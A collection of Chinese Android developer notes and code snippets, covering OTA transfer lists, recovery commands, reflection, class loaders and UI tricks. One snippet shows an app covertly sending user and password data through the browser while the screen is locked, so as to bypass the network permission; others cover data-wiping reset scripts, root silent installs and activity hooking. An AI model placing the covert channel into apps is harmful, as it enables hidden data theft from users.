https://download-installer.cdn.mozilla.net/pub/firefox/nightly/2017/11/2017-11-19-22-01-26-mozilla-central/
连接上手机,运行adb forward tcp:6000 localfilesystem:/data/local/debugger-socket
打开浏览器，选项--->developer--->WEDIDE，如下图，点击Screenpshot就可以截图了


仿 wechat 和 支付宝 防止截屏???
getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE)
设置安全窗口，禁用系统截屏。防止 App 中的一些界面被截屏，并显示在其他设备中造成信息泄漏。（常见手机设备系统截屏操作方式为：同时按下电源键和音量键。）
比如支付宝 App 的“向商家付款”的包含付款二维码的界面。（补充说明一点，微信付款界面不是这么做的，采用的是在 onResume() 生命周期方法中实时刷新付款二维码，与支付宝在安全方法采取的手段不同。）


https://android-notes.github.io/2016/12/03/android%E9%95%BF%E6%88%AA%E5%B1%8F%E5%8E%9F%E7%90%86/
https://juejin.im/post/5a33403b6fb9a045132abdb6
https://mp.weixin.qq.com/s/JPVZtErFTzJ5PDuTAPk0DA
```

## system.transfer.list深度解析

```text
system.transfer.list  system.new.dat
很明显，通过名字我们就知道这两个文件的作用，system.new.dat为数据部分，system.transfer.list为转换的描述列表，我们可以通过这两个文件完成升级。

我们打开一个升级包的升级脚本META-INF\com\google\android\updater-script
block_image_update("/dev/block/system", package_extract_file("system.transfer.list"), "system.new.dat", "system.patch.dat");
调用的是block_image_updater接口，传入system.transfer.list及system.new.dat文件来实现升级。

block_image_updater的代码实现在
bootable/recovery/updater/blockimg.cpp中：
void RegisterBlockImageFunctions() {
    RegisterFunction("block_image_verify", BlockImageVerifyFn);
    RegisterFunction("block_image_update", BlockImageUpdateFn);
    RegisterFunction("block_image_recover", BlockImageRecoverFn);
    RegisterFunction("check_first_block", CheckFirstBlockFn);
    RegisterFunction("range_sha1", RangeSha1Fn);
}
想了解具体实现的过程，可以另行深入研究，本文不再探讨。

我们来看看system.transfer.list：
3
133943
0
0
new 48,0,32770,32897,32899,33411,65535,65536,65538,98304,98306,98433,98435,98947,131071,131072,131074,163840,163842,163969,163971,164483,195737,196608,196610,229376,229378,229505,229507,230019,235652,262144,262146,294912,294914,295041,295043,327680,327682,360448,360450,393216,393218,425984,425986,458752,458754,491520,491522
zero 70,32770,32897,32899,33411,65535,65536,65538,66050,97792,98304,98306,98433,98435,98947,131071,131072,131074,131586,163328,163840,163842,163969,163971,164483,195737,196608,196610,197122,228864,229376,229378,229505,229507,230019,235652,236164,261632,262144,262146,262658,294400,294912,294914,295041,295043,295555,327168,327680,327682,328194,359936,360448,360450,360962,392704,393216,393218,393730,425472,425984,425986,426498,458240,458752,458754,459266,491008,491520,491522,492034
erase 24,66050,97792,131586,163328,197122,228864,236164,261632,262658,294400,295555,327168,328194,359936,360962,392704,393730,425472,426498,458240,459266,491008,492034,524288


其中：
3 ： 为transfer的版本，目前已经支持从1-4版本
133943：为总共new的block数量。
0： stash slots没有使用，所以这里两个都是0
0：
new：需要写入的block块范围总数：总共48个范围，【0-32770】 【32897-32899】【33411-65535】......
zero：需要填充0的block块范围总数：总共70个范围，【32770-32897】 【32899-33411】.......
erase：需要擦除的block块范围总数：总共24个范围，【66050-97792】 【131586-163328】.......


system.transfer.list是由build/tools/releasetools/blockimgdiff.py生成的，我们来验证下前面几个参数：
    out.insert(0, "%d\n" % (self.version,))   # format version number
    out.insert(1, "%d\n" % (total,))
    # v3+: the number of stash slots is unused.
    out.insert(2, "0\n")
    out.insert(3, str(max_stashed_blocks) + "\n")

    with open(prefix + ".transfer.list", "wb") as f:
      for i in out:
        f.write(i)
第一行是版本，第二行是total的block数量，由于没有使用stash，第三行四行为0。


我们再次验证下总共写入的total是否正确。
1.我们先确认block的大小，blockimg.cpp中定义为4K
static constexpr size_t BLOCKSIZE = 4096;

2.确认升级包中system.new.dat的大小，其值为548630528
$ ls -l system.new.dat
-rwxr--r-- 1 xxxxxx.xx szsoftware 548630528 Mar 19 16:37 system.new.dat

3.我们再来计算下总共需要写入的total
total=system.new.dat/block=548630528/4096=133943，刚好即为写入的总的total。


我们再来看看这些所有的new zero erase的描述区间
【0-32770】【32770-32897】【32897-32899】...【66050-97792】...【492034-524288】
   new                      zero                     new                      erase                      erase

总共524288个block需要处理
524288*4096=2147483648byte=2048Mb=2G
正好为我们ext4 system 分区的大小，也就是我们把整个2G的system分区按照4096的大小分割，然后给每个block赋予了new/zero/erase的属性，然后保存到transfer.list文件，把所有需要new的数据，生成了new.dat文件。

在最新的version=4的版本中，我们发现system.new.dat文件不见了，增加了vendor.new.dat.br文件，并且计算的时候，发现了vendor.new.dat.br文件打大小变小了，原来是最新的版本，加入了压缩功能，vendor.new.dat.br为采用压缩后的block数据部分。
```

## [recovery]  [CMD] 恢复出厂设置的脚本

```text
#/bin/sh

rm -rf /cache/recovery/command
echo "--wipe_data" > /cache/recovery/command
echo "--wipe_cache" >> /cache/recovery/command
sync
sync
sleep 1
sync
sync
reboot recovery

把以上脚本写到一个 reset.sh 文件中
push reset.sh 到 /data/local/tmp/
adb shell sh /data/local/tmp/reset.sh

恢复出厂设置的流程
(1)用户在系统设置中选择了“恢复出厂设置”。
(2)Android 系统在/cache/recovery/command 中写入“--wipe_data”。
(3)设备重启后发现了 command 命令,于是进入 recovery。
(4)recovery 将在 BCB(bootloader control block)中写入“boot-recovery”和“--wipe_data”具体是在 get_args()函数中——这样即便设备此时重启,也会再进入 erase 流程。
(5)通过 erase_volume 来重新格式化/data。
(6)通过 erase_volume 来重新格式化/cache。
(7)finish_recovery 将擦除 BCB,这样设备重启后就能进入正常的开机流程了。
(8)main 函数调用 reboot 来

OTA升级的流程
(1)OTA 包的下载过程参见前一小节的介绍。假设包名是 update.zip,存储在 SDCard 中。
(2)系统在/cache/recovery/command 中写入"--update_package=[路径名] "。
(3)系统重启后检测到 command 命令,因而进入 recovery。
(4)get_args 将在 BCB 中写入"boot-recovery" 和 "--update_package=..." —— 这样即便此时设备重启,也会尝试重新安装 OTA 升级包。
(5)install_package 开始安装 OTA 升级包。
(6)finish_recovery 擦除 BCB,这样设备重启后就可以进入正常的开机流程了。
(7)如果 install 失败的话:prompt_and_wait 显示错误,并等待用户响应;用户重启(比如拔掉电池等方式)。
(8)main 调用 maybe_install_firmware_update,OTA 包中还可能包含 radio/hboot firmware 的更新,具体过程略。
(9)main 调用 reboot 重启系统。

ps:
command 支持的几个命令
--send_intent=anystring             将 text 输出到 recovery.intent 中
--update_package=path               安装 OTA 包
--wipe_data                         擦除 user data,然后重启
--wipe_cache                        擦除 cache(不包括 user data),然后重启
--set_encrypted_filesystem=on|off   enable/disable 加密文件系统
--just_exit                         直接退出,然后重启

//恢复出厂设置流程分析
https://blog.csdn.net/kehyuanyu/article/details/47054325
```

## 通过反射 Exec 类来执行二进制可执行文件

```text
try {
 // android.os.Exec is not included in android.jar so we need to use reflection.
 Class<?> execClass = Class.forName("android.os.Exec");
 Method createSubprocess = execClass.getMethod("createSubprocess",
        String.class, String.class, String.class, int[] .class);
 Method waitFor = execClass.getMethod("waitFor", int.class);

 // Executes the command.
 // NOTE: createSubprocess() is asynchronous.
 int[]  pid = new int[1] ;
 FileDescriptor fd = (FileDescriptor)createSubprocess.invoke( null, "/system/bin/ls", "/sdcard", null, pid);

    // Reads stdout.
 // NOTE: You can write to stdin of the command using new FileOutputStream(fd).
 FileInputStream in = new FileInputStream(fd);
 BufferedReader reader = new BufferedReader(new InputStreamReader(in));
 String output = "";
 try {
     String line;
     while ((line = reader.readLine()) != null) {
         output += line + "/n";
    }
 } catch (IOException e) {
     // It seems IOException is thrown when it reaches EOF.
 }

 // Waits for the command to finish.
 waitFor.invoke(null, pid[0] );

 return output;
} catch( ... )
```

## ConditionVariable

```text
frameworks/base/core/java/android/os/ConditionVariable.java

public class MainActivity extends Activity implements OnClickListener {
    private Button btn_output;
    private TextView textView;
    private MyHandler mHandler;
    private boolean isStart;
    private String str = "";
    private ConditionVariable mConditionVariable;
    private final int REFRESHTEXT = 1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        btn_output = (Button) findViewById(R.id.btn);
        btn_output.setOnClickListener(this);
        textView = (TextView) findViewById(R.id.txt);
        mHandler = new MyHandler();
        mConditionVariable = new ConditionVariable();
        isStart = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                // TODO Auto-generated method stub
                while(isStart) {
                    //延时等待3秒
                    mConditionVariable.block(3000);
                    //如果是点击了按钮，则先将条件重置，否则block会失效
                    mConditionVariable.close();
                    //线程唤醒后通知主线程更新TextView的文本
                    mHandler.sendEmptyMessage(REFRESHTEXT);
                }
            }
        }).start();
    }
   
    private class MyHandler extends Handler {
        @Override
        public void handleMessage(Message msg) {
            switch(msg.what) {
            case REFRESHTEXT:
                textView.setText(str += 's');
                break;
            }
        }
    }
       
    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        mConditionVariable.open();
    }
   
    @Override
    protected void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
        isStart = false;
    }
}
```

## Fuzz 是什么玩意 ???

```text
模糊测试定义为“通过向应用提供非预期的输入并监控输出中的异常来发现软件中的故障(faults)的方法”。典型而言,模糊测试利用自动化或是半自动化的方法重复地向应用提供输入。显然,上述定义相当宽泛,但这个定义阐明了模糊测试的基本概念。 
用于模糊测试的模糊测试器(fuzzer)分为两类:一类是基于变异(mutation-based)的模糊测试器,这一类测试器通过对已有的数据样本进行变异来创建测试用例;而另一类是基于生成(generation-based)的模糊测试器,该类测试器为被测系统使用的协议或是文件格式建模,基于模型生成输入并据此创建测试用例。这两种模糊测试器各有其优缺点
```

## Android 关机实现

```text
private void shutDown(){
    Intent intent = new Intent("android.intent.action.ACTION_REQUEST_SHUTDOWN");
    intent.putExtra("android.intent.extra.KEY_CONFIRM", false);
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    startActivity(intent);
}

需要在AndroidManifest.xml里添加 
Android:sharedUserId=”android.uid.system”和”权限。 
android:sharedUserId=”android.uid.system”是将自己的程序加入到了系统的进程中，同时也将获得系统的权限。需要添加系统签名。 

当然，这些代码在eclipse里会报错（我当时用的是eclipse），把这些错误报告删掉，强行编译就可以了。具体做法是把problems里的把与它相关的错误报告删除掉。Windows-show view-other-搜索problems可以找到错误报告。上机用时需要添加系统签名，不然安装不上。

签名用目标系统的platform密钥来重新给apk文件签名。在我的Android源码目录中的位置是”build\target\product\security”，下面的platform.pk8和platform.x509.pem两个文件。然后用Android提供的Signapk工具来签名，signapk的源代码是在”build\tools\signapk”下，用法为”signapk 
platform.x509.pem platform.pk8 input.apk 
output.apk”，文件名最好使用绝对路径防止找不到，也可以修改源代码直接使用。

root过的手机也可以用 Runtime 执行 su reboot -p 命令来关机
```

## 解析 ramdisk.img

```text
首先对 ramdisk.img 执行 file 命令,得到如下结果:
$file ramdisk.img
ramdisk.img: gzip compressed data, from Unix
$gzip –d ramdisk.img.gz
这说明它是一个 gzip 的压缩文件。我们将其改名为 ramdisk.img.gz,再进行解压。具体命令
如下:
这时会得到另一个名为 ramdisk.img 的文件,不过文件类型变了:
$file ramdisk.img
ramdisk.img: ASCII cpio archive (SVR4 with no CRC)
由此可知,这时的 ramdisk.img 是 CPIO 文件了。
再来执行以下操作:
$cpio -i -F ramdisk.img
3544 blocks
```

## [Snippet] 一次性关闭所有的Activity

```text
ActivityManager am = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);   
am.restartPackage(getPackageName()); 
系统会将，该包下的 ，所有进程，服务，全部杀掉，就可以杀干净了，要注意加上
<uses-permission android:name="android.permission.RESTART_PACKAGES" />
```

## [Snippet] 自动滚动ListView

```text
<ListView android:id="@android:id/list" 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent" 
    android:stackFromBottom="true" 
    android:transcriptMode="alwaysScroll" />
```

## [Snippet]  [UA] 获得手机UA

```text
public String getUserAgent() {
    return ProductProperties.get(ProductProperties.USER_AGENT_KEY, null);
}
```

## javac 编译带中文的java文件报错unmappable character for encoding GBK

```text
问题：进行以上Java编译的时候，出现unmappable character for encoding GBK。

我的解决方法：当我将编译改写为javac -encoding UTF-8 Exerc02.java就可以正常输出。
我的分析：我的电脑字符集默认的是GBK,有什么办法能改为unicode么?
 
你用javac -encoding UTF-8 Exerc02.java能正常输出, 说明你的java文件的编码是utf8
你用javac Exerc02.java编译出错, 说明你的系统默认编码不是utf8
推测你应该是window系统吧
记事本打开Exerc02.java文件, 文件另存为-->选择编码ANSI保存（采用强大的编辑器UltraEdit）
然后javac Exerc02.java就可以编译了
```

## 拦截 Back 键，使 App 进入后台而不是关闭

```text
@Override
public void onBackPressed() {
    Intent launcherIntent = new Intent(Intent.ACTION_MAIN);
    launcherIntent.addCategory(Intent.CATEGORY_HOME);
    startActivity(launcherIntent);
}
```

## bitmap.extractAlpha()

```text
从源 bitmap 中根据 alpha 获取一个新的 bitmap 对象。比较绕口，通常 App 中的 Icon 多数是纯色透明像素背景组成，利用这个方法可以对该图的非透明区域着色，有多种使用场景，常见如 Button 的 pressed 状态，View 的阴影状态等。举个例子：
private static Bitmap getDropShadow(ImageView iv, Bitmap src, float radius, int color) {

    final Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
    paint.setColor(color);

    final int width = src.getWidth(), height = src.getHeight();
    final Bitmap dest = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
    final Canvas canvas = new Canvas(dest);
    final Bitmap alpha = src.extractAlpha();
    canvas.drawBitmap(alpha, 0, 0, paint);

    final BlurMaskFilter filter = new BlurMaskFilter(radius, BlurMaskFilter.Blur.OUTER);
    paint.setMaskFilter(filter);
    canvas.drawBitmap(alpha, 0, 0, paint);
    iv.setImageBitmap(dest);

    return dest;
}
```

## [ota] 从ota卡刷包recovery-from-boot.p生成recovery.img

```text
如果手机官方没有提供线刷包，和无法通过手机里面提取recovery情况下可以尝试提供卡刷包来生成官方recovery.img，当然你的OTA卡刷包里面必须要有boot.img、recovery-from-boot.p、install-recovery.sh三个文件缺一不可，然后利用android applypatch来生成，system/bin/目录下即可。
1、applypatch指令帮助： shell@ha3g:/data/local/tmp $ applypatch
usage: applypatch [-b ]  <src-file> <tgt-file> <tgt-sha1> <tgt-size>
[: …] 
or applypatch -c <file> [ …] 
or applypatch -s <bytes>
or applypatch -l
2、将applypatch、boot.img、recovery-from-boot.p推送（adb push ）到/data/local/tmp/目录；给予applypatch 755quan 3、打开nstall-recovery.sh文件： #!/system/bin/sh
update_recovery –check-sha1 908410f138130a19caf8fbbc2f2d89496f6caa41 \
–src-sha1 a56291c5b942895ecf64da89e55c5ac444b5a939 \
–tgt-sha1 f44fd8fdc4bc4382fab01f5eb966ee9956b42120 \
–tgt-size 11330560 \
–patch /system/recovery-from-boot.p
其中：src-sha1表示recovery-from-boot.p的sha1值；tgt-size表示recovery的大小；tgt-sha1表示recovery的sha1值；
4、生成命令如下： applypatch <boot文件> <recovery.img tgt-sha1值> <tgt-sized大小> <src-sha1值>:recovery-from-boot.p 如：applypatch boot.img recovery.img f44fd8fdc4bc4382fab01f5eb966ee9956b42120 11330560 a56291c5b942895ecf64da89e55c5ac444b5a939:recovery-from-boot.p
5、生成成功入下图所示：
```

## 文件上传

```text
https://www.runoob.com/w3cnote/android-tutorial-upload-file.html

https://topmanopensource.iteye.com/blog/1605238
```

## [性能] strace

```text
分析发烫的应用进程在干嘛
需要用到linux下的strace命令，但是android是没有集成这个命令的，android版本的下载地址：
http://benno.id.au/android/strace
下载完成后，上传到手机中：
我们adb push strace /system/bin，在模拟器上是上传到/system/bin会报out of memory错误，我们也可以上传到/data目录下，如果没有执行权限，还需要chmod 777 strace.
strace命令有很多参数，直接执行strace会显示使用说明:

其中-p参数输入的就是进程号，第一步中我们找到com.tianxia.test的进程ID是644，我们看看这个应用占用这么高的cpu在干嘛?

strace -p 644
输出如下：

它的系统调用一直是gettimeofday,一直输出这个，显然哪里一定进入死循环了，而且是获取时间的死循环，然后结合logcat和代码，定位这段代码(就是前面我们给出的那段代码了)解决这个bug。
```

## @ ? 的用法和解释

```text
Syntax
Now let's see what is the actual syntax for referencing different resources.

Referencing resources (@)
@[package_name:] resource_type/resource_name

package_name - optional name of the package this resource belongs to (by default - your app package). Reserved package - android. Used for resources shipping with platform
resource_type - the R subclass for the resource type (attr, color, string, dimen, etc)
resource_name - an actual name of the resource we are trying to reference.
Let's actually take my first 2 examples and try to break them down:

android:background="@color/colorPrimary"
android:background="@com.myapp:color/colorPrimary"
As you can see - both of them are equivalent since by default, package name is set to our app's package name, so it is not necessary to mention it:

package(optional) = com.myapp
resource_type = color
resource_name = colorPrimary
As you might think, Android ships with some predefined resources for entire OS. F.i. I could reference some built-in color this way:

android:background="@android:color/holo_orange_dark"
Here is what we got in this case:

package = android - referencing built-in resources
resource_type = color
resource_name = holo_orange_dark
PLEASE NOTE

Nowadays, lots of people use AppCompat (and if you don't - you probably should), and AppCompat often defines its own resources. Even though AppCompat is a first-party lib shipped by Google, it is not really a part of operating system. Instead, those resources get merged into your app, so you don't need to use android keyword to reference those.

Example:

android:background="?selectableItemBackground"
Here, even though we don't have custom style attribute name selectableItemBackground in our app (notice that we didn't use android: prefix), we can still reference it because it was "added" to our app by AppCompat.

Referencing style attributes (?)
Guess what. The syntax is pretty similar to resources: 
?[package_name:]  [resource_type/] resource_name

There one small difference though.

The only allowed resource_type when referencing style attributes is attr. So given that, Android packaging tool actually allows us to omit resource_type, so it is effectively optional.

So following expressions mean exactly the same thing from Android perspective:

android:background="?com.myapp:attr/colorPrimary" //verbose format
android:background="?com.myapp:colorPrimary" //attr is skipped since its optional
android:background="?attr/colorPrimary" //package is skipped since its optional 
android:background="?colorPrimary"  // package & attr is skipped
```

## [知识点] ClassLoader和DexClassLoader

```text
上面说到JAVA的动态加载的机制就是通过ClassLoader来实现的，ClassLoader也是实现反射的基石。ClassLoader是JAVA提供的一个类，顾名思义，它就是用来加载Class文件到JVM，以供程序使用的。

但是问题来了，ClassLoader加载文件到JVM，但是Android是基于DVM的，用ClassLoader加载文件进DVM肯定是不行的。于是Android提供了另外一套加载机制，分别为 dalvik.system.DexClassLoader 和 dalvik.system.PathClassLoader，区别在于 PathClassLoader 不能直接从 zip 包中得到 dex，因此只支持直接操作 dex 文件或者已经安装过的 apk（因为安装过的 apk 在 cache 中存在缓存的 dex 文件）。而 DexClassLoader 可以加载外部的 apk、jar 或 dex文件，并且会在指定的 outpath 路径存放其 dex 文件。

ClassLoader在JAVA中的应用
下面利用反射来调用另一个类中的方法

//定义一个测试类，用来被反射调用
package com.izzy;
public class Test {
    private String s;
    //构造方法
    public Test(String s) {
        this.s = s;
    }
    //定义一个方法，用来输出，构造方法中传递进来的参数
    public void display() {
        System.out.println(s);
    }

}

package com.izzy;
import java.lang.reflect.Constructor;
public class Client {
    public static void main(String[]  s) {
        try {
            //首先拿到系统ClassLoader，并加载Class，返回的是一个Class对象clazz 
            Class clazz = ClassLoader.getSystemClassLoader().loadClass("com.izzy.Test");
            //通过clazz 拿到构造方法并转换成对象
            Constructor constructor = clazz.getConstructor(String.class);
            Object obj = constructor.newInstance("I AM IZZY");
            //通过clazz 拿到成员方法
            Method method = clazz.getMethod("display", null);
            method.invoke(obj, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

DexClassLoader在Android中的应用
以一个例子来说明DexClassLoader用法（本例采用两个已安装的Apk），现在有两个Apk：Share和Test，利用Test来调用Share 里面的方法。

首先在Share　apk中定义Share类，其中有一个display()方法提供给远程调用

public class Share {
    public void display(String s) {
        Log.e("IZZY", s);
    }
}

public void getFromRemote() {
    Intent intent = new Intent("com.IZZY");
    PackageManager pm = getPackageManager();
    List<ResolveInfo> resolveInfos = pm.queryIntentActivities(intent, 0);

    ResolveInfo resolveInfo = resolveInfos.get(0);
    ActivityInfo activityInfo = resolveInfo.activityInfo;
    //拿到目标类的包名
    String packageName = activityInfo.packageName;

    //拿到目标类所在的apk或者jar存放的路径
    String dexPath = activityInfo.applicationInfo.sourceDir;
    //该路径为拿到目标类dex文件存放在调用者里的路径
    String dexOutputDir = getApplicationInfo().dataDir;
    //拿到目标类所使用的C/C++库存放路径
    String nativeLibraryDir = activityInfo.applicationInfo.nativeLibraryDir;
    //拿到类装载器
    ClassLoader classLoader = getClassLoader();

    //DexClassLoader参数分别对应以上四个参数
    DexClassLoader dcl = new DexClassLoader(dexPath,dexOutputDir,nativeLibraryDir,classLoader);
    try {
        //装载目标类
        Class<?> clazz = dcl.loadClass(packageName + ".Share");
        //拿到构造器并实例化对象
        Constructor<?> constructor = clazz.getConstructor();
        Object o = constructor.newInstance();
        //拿到成员方法
        Method display = clazz.getMethod("display", String.class);
        display.invoke(o, "I AM IZZY");
    } catch (Exception e) {
        e.printStackTrace();
    }
}

DexClassLoader 在 Android 中的使用场景
上面是是使用的已经安装过的Apk，如果采用未安装过的jar包或者Apk，则实例化DexClassLoader的时候把相应路径改为需要加载的jar包或者Apk路径亦可拿到结果。这就使得DexClassLoaderde可以应用在HotFix（热修复），动态加载框架等等 一些基于插件化的架构中。
```

## [开源]  [工具] java反射工具库 jOOR(<https://github.com/jOOQ/jOOR>)

```text
Reflect.on(UserManager.class).call("get", getApplicationContext());
```

## [开源] TextView 自动换行,每行排满的自定义TextView

```text
https://juejin.im/post/5d4a3359f265da03eb13b28c?utm_source=gold_browser_extension
```

## [知识点] FLAG_ACTIVITY_NEW_TASK

```text
7、在一个程序中通过广播启动另一个程序的Activity时，需要在被启动的BroadcastReceiver里添加：intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
```

## [Snippet] 缩短字体与Button控件间的边缘距离，只要padding=0dp就可以了

```text
android:padding="0dp"
```

## HandlerThread

```text
AsyncTask是获得后台线程的最简单方式，但它基本上不适用于重复且长时间运行的任务，比如后台下载的图片如果过大，推荐用HandlerThread代替，原因是自Android3.2版本开始，AsyncTask不再为每一个AsyncTask实例单独创建一个线程。而是使用一个Executor在单一的后台线程上运行所有AsyncTask的后台任务。这意味着每个AsyncTask都需要排除逐个运行，显然，长时间运行的AsyncTask会阻塞其他AsyncTask。
```

## [Snippet] 获取Android运行时最大内存限制

```text
ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
int maxMenory = manager.getMemoryClass();
```

## [Snippet] 实现动态启动未注册的Activity

```text
https://github.com/BolexLiu/AndroidHookStartActivity

1.application标签里配置一个壳Activity

<activity android:name=".HostActivity" />
2.注册一下,其中this为context

AMSHookUtil.hookStartActivity(this);
3.以后就可以按照标准的Intent启动为那些未被注册的Activity。

Intent intent = new Intent(MainActivity.this, OtherActivity.class);
startActivity(intent);

原理详解：http://www.jianshu.com/p/2ad105f54d07

使用黑科技启动未注册的Activity
https://mp.weixin.qq.com/s/gzg0a_afY0459w07WvuXkQ
```

## [Snippet] 应用卸载反馈

```text
https://github.com/CharonChui/UninstallFeedback

// Android.mk
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE    := uninstall_feedback
LOCAL_SRC_FILES := uninstall_feedback.c
LOCAL_C_INCLUDES := $(LOCAL_PATH)/include
LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog
include $(BUILD_SHARED_LIBRARY)

Java_com_charon_uninstallfeedback_MainActivity_initUninstallFeedback(
        JNIEnv* env, jobject thiz, jstring packageDir, jint sdkVersion) {
    char * pd = Jstring2CStr(env, packageDir);
    //fork子进程，以执行轮询任务
    pid_t pid = fork();
    if (pid < 0) {  // fork失败了
    } else if (pid == 0) {
        // 可以一直采用一直判断文件是否存在的方式去判断，但是这样效率稍低，下面使用监听的方式，死循环，每个一秒判断一次，这样太浪费资源了。
        int check = 1;
        while (check) {
            FILE* file = fopen(pd, "rt");
            if (file == NULL) {
                if (sdkVersion >= 17) { // Android4.2系统之后支持多用户操作，所以得指定用户
                    execlp("am", "am", "start", "--user", "0", "-a",
                            "android.intent.action.VIEW", "-d",
                "http://shouji.360.cn/web/uninstall/uninstall.html",
                            (char*) NULL);
                } else {
                    // Android4.2以前的版本无需指定用户
                    execlp("am", "am", "start", "-a",
                        "android.intent.action.VIEW", "-d",
                "http://shouji.360.cn/web/uninstall/uninstall.html",
                            (char*) NULL);}
                check = 0;
            } else {
            }
            sleep(1);
        }
    } 
}

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String packageDir = "/data/data/" + getPackageName();
        initUninstallFeedback(packageDir, Build.VERSION.SDK_INT);
    }
    private native void initUninstallFeedback(String packagePath, int sdkVersion);
    static {
        System.loadLibrary("uninstall_feedback");
    }
}
```

## [Snippet] 无网络权限访问网络

```text
Timer timer = new Timer();
final KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
TimerTask task = new TimerTask() {
    @Override
    public void run() {
        // 2017/6/26  如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据
        if (km.inKeyguardRestrictedInputMode()) {
            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            intent.addCategory(Intent.CATEGORY_BROWSABLE);
            intent.setData(Uri.parse("http://192.168.0.2/send?user=1&pwd=2"));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }else{
            // 2017/6/26  判断如果在桌面就什么也不做 ,如果不在桌面就返回
            Intent intent = new Intent();
            intent.setAction("android.intent.action.MAIN");
            intent.addCategory("android.intent.category.HOME");
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.addCategory("android.intent.category.MONKEY");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
};
timer.schedule(task, 1000, 2000);
```

## [Snippet] Root情况下静默安装

```text
ShellUtils.execCmd("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install " + "apk路径", true);
```

## [Snippet] tools命名空间

```text
https://blog.csdn.net/Coo123_/article/details/99942626

toos:layout / tools:listitem / tools:listheader / tools:listfooter 开发Fragment或listview的时候，无法预览界面，用上面的工具，就可以在布局中看到界面了噢！界面如下：

tools:node="merge"
如果合并中没有冲突，合并所有属性及嵌套元素
tools:node="merge-only-attributes"
仅合并属性
tools:node="replace"
完全替换低优先级元素。
tools:xxx
tools:text="xxx"可以让我们在开发时候预览，而不用担心打包后，显示出来

shrinkResources 开启这个之后会把一些不用的资源给移除掉，用下面的方法可以保护图片不被移除
tools:keep="@drawable/ic_*,@drawable/t_all"     这样达到保护我们的ic_前缀图片不要被清理。
```

## [Snippet] TextUtils.join()拼接字符串

```text
String[]  strs = {"aaa","bbb"};
String join = TextUtils.join(",", strs);
assert join.equals("aaa,bbb");
List<String> lists = new ArrayList<>();
lists.add("ddd");
lists.add("eee");
String joinList = TextUtils.join(",", lists);
assert joinList.equals("ddd,eee");
```

## [Snippet] Activity相关方法

```text
moveTaskToBack(boolean nonRoot)   让APP进入后台运行

startActivities(new Intent[] {aIntent,bIntent})  会先进入B，返回的话到A。（跳转详情的时候，返回主页面。是不是有点用?）
```

## SharedPreference相关

```text
commit是同步操作。apply是异步操作。
我们可以用v4包的方法来处理提交请求。(SharedPreferencesCompat.EditorCompat.getInstance().apply()
```

## [Snippet] 判断是否连接到远程服务器

```text
Runtime runtime = Runtime.getRuntime();
//-c 是ping几次 ，-w是等待时间，秒为单位
Process exec = runtime.exec("ping  -c 2 -w 3 www.baidu.com");
if (exec.waitFor() == 0) {
    Log.d("liu", "连接成功");
} else {
    Log.d("liu", "连接失败");
}
```

## [Snippet] ArgbEvaluator

```text
ArgbEvaluator.evaluate(float fraction, Object startValue, Object endValue)
```

## [RTL]  [Snippet] TextView设置内容右对齐

```text
android:layoutDirection="rtl"
android:textDirection="ltr"
```

## [Snippet] 去除TextView默认的padding

```text
android:includeFontPadding="false"
android:minHeight="0dp"
android:padding="0dp"
```

## [Snippet] URLUtil

```text
isNetworkUrl()
isAboutUrl()
isContentUrl()
isDataUrl()
isJavaScriptUrl()
```

## [Snippet] ScheduledThreadPoolExecutor

```text
ScheduledThreadPoolExecutor scheduled = new ScheduledThreadPoolExecutor(2);
scheduled.scheduleAtFixedRate(new Runnable() {
    @Override
    public void run() {
        handler.sendEmptyMessage(11);
    }
}, 0, 40, TimeUnit.MILLISECONDS);
//第一个参数0。第一次，延迟时间
//第二个参数40。表示间隔时间
//第三个参数。表示单位
```

## [Snippet] 4种Android获取View宽高的方式

```text
public void onWindowFocusChanged(boolean hasFocus) {
    super.onWindowFocusChanged(hasFocus);
    if (hasFocus) {
        System.out.println("onWindowFocusChanged width=" + tvTest.getWidth() + " height=" + tvTest.getHeight());
    }
}

private void getSize1() {
    ViewTreeObserver vto = tvTest.getViewTreeObserver();
    vto.addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener() {
        @Override
        public boolean onPreDraw() {
            int height = tvTest.getMeasuredHeight();
            int width = tvTest.getMeasuredWidth();
            System.out.println("height" + height);
            System.out.println("width" + width);
            return true;
        }
    });
}

private void getSize2() {
    ViewTreeObserver viewTreeObserver = tvTest.getViewTreeObserver();
    viewTreeObserver.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {
        @Override
        public void onGlobalLayout() {
            tvTest.getViewTreeObserver().removeGlobalOnLayoutListener(this);
            System.out.println("onGlobalLayout width=" + tvTest.getWidth() + " height=" + tvTest.getHeight());
        }
    });
}

private void getSize3() {
    tvTest.post(new Runnable() {
        @Override
        public void run() {
            System.out.println("postDelayed width=" + tvTest.getWidth() + " height=" + tvTest.getHeight());
        }
    });
}
```

## 异步加载布局 AsyncLayoutInflater

```text
https://www.itcodemonkey.com/article/14874.html

public void onCreate() {
